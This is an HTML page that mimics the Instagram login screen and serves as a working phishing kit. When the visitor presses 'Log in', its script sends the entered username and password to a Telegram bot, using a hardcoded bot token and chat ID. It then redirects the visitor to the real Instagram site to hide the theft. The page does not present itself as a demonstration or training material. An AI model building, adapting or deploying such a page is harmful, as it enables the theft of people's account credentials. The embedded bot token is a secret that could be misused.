<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            transition: background 0.3s, color 0.3s;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 350px;
            transition: background 0.3s, color 0.3s;
        }
        .logo {
            width: 120px;
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        .forgot {
            font-size: 14px;
            color: #00376b;
            margin-top: 10px;
        }
        /* Dark Mode Styles */
        .dark-mode {
            background-color: #181818;
            color: white;
        }
        .dark-mode .container {
            background-color: #242424;
            box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.1);
        }
        .dark-mode input {
            background-color: #333;
            color: white;
            border: 1px solid #555;
        }
        .dark-mode .login-btn {
            background-color: #1e90ff;
        }
        /* Toggle Button */
        .toggle-container {
            position: absolute;
            top: 20px;
            right: 20px;
            cursor: pointer;
            font-size: 18px;
            background: #ccc;
            padding: 5px 10px;
            border-radius: 20px;
            transition: background 0.3s;
        }
        .dark-mode .toggle-container {
            background: #444;
            color: white;
        }
    </style>
</head>
<body>

    <!-- Dark Mode Toggle Button -->
    <div class="toggle-container" onclick="toggleDarkMode()">üåô Dark Mode</div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h2>Log in to Instagram</h2>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button class="login-btn" onclick="sendToTelegram()">Log in</button>
        <p class="forgot">Forgot password?</p>
    </div>

    <script>
        function sendToTelegram() {
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;
            let botToken = "7376868831:AAGD_Awg3e1soOOhS6aMX_lYY3_liWtjdKk";
            let chatId = "6036348910";

            if (username === "" || password === "") {
                alert("Please fill all fields!");
                return;
            }

            let message = `üì© Instagram Login Attempt\nüë§ Username: ${username}\nüîë Password: ${password}`;
            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).then(response => {
                if (response.ok) {
                    window.location.href = "https://www.instagram.com"; // Redirect to Instagram
                } else {
                    alert("‚ùå Failed to send!");
                }
            });
        }

        function toggleDarkMode() {
            document.body.classList.toggle("dark-mode");
            let modeText = document.querySelector(".toggle-container");
            if (document.body.classList.contains("dark-mode")) {
                modeText.innerHTML = "‚òÄÔ∏è Light Mode";
            } else {
                modeText.innerHTML = "üåô Dark Mode";
            }
        }
    </script>
</body>
</html>
